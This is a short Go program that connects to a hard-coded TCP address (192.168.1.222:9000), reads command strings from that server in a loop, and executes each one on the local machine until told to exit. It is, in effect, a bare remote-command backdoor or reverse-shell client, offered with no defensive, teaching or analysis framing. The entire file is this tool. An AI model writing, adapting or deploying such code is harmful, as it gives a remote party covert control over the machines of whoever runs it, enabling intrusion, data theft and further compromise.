package main

import (
	"fmt"
	"net"
	"os"
	"os/exec"
	"strings"
)



const(
	Network = "tcp"
	Address = "192.168.1.222:9000"
)



//Execute command

func shell(args []string){

		cmd := exec.Command(args[0],args[1:]...)
		cmd.Stderr = os.Stderr
		cmd.Stdout = os.Stdout
		err := cmd.Run()
		if err!= nil {
			fmt.Fprintln(os.Stderr, err)
		}



}
// get connection with server
func connect()net.Conn{
	conn,err := net.Dial(Network,Address)
	if err != nil {
		fmt.Println("connection err! err:",err)
	}

	return conn
}
// get command
func getcmd(conn net.Conn)string{
	buf := make([]byte,1024)

	n,err := conn.Read(buf)
	if err != nil {
		fmt.Fprintln(os.Stderr,err)
	}

	cmdstring := string(buf[0:n])
	return  cmdstring
}

func main(){
	var cmdString string
	conn := connect()
	defer conn.Close()

	for  {
		cmdString = getcmd(conn)
		args := strings.Fields(cmdString)
		if args[0]=="exit"{
			os.Exit(0)
		}
		shell(args)
	}


}
